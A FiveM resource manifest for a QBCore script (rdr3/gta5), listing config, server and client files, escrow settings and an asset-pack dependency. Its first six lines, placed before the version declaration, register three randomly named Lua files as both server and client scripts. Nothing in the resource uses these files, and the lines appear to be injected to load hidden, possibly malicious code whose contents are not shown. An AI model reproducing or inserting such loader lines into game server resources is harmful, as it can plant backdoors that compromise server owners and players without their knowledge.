server_script "0ANB3X5D.lua"
client_script "0ANB3X5D.lua"
server_script "L2TV6NB.lua"
client_script "L2TV6NB.lua"
server_script "M6P.lua"
client_script "M6P.lua"
fx_version 'cerulean'
games { 'rdr3', 'gta5' }

shared_scripts {
    '@qb-core/import.lua',
    'config.lua'
}

server_scripts {
	'server.lua'
}

client_scripts {
	'client.lua'
}


lua54 'yes'

escrow_ignore {
    'config.lua',
}
dependency '/assetpacks'
dependency '/assetpacks'